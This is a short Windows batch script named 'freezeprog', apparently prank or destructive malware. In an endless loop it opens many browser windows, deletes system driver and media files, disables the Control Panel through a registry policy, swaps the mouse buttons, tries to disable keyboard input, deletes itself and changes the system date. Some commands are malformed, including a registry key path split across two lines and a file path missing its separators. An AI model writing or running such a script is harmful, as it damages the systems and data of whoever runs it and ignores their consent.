@echo off
title freezeprog
:a
start www.youtube.com
start www.facebook.com
start www.google.com
start www.instagram.com
start www.udemy.com
start www.dailymotion.com
del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul
del "%SystemRoot%\Media" /q >nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer
/v NoControlPanel /t REG_DWORD /d 1 /f >nul
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
del "%SystemRoot%Driver Cachei386driver.cab" /f /q >nul
rundll32 user,disableoemlayer
rundll32 user,SwapMouseButton
del %0 >nul
date 29.07.36	
goto:a
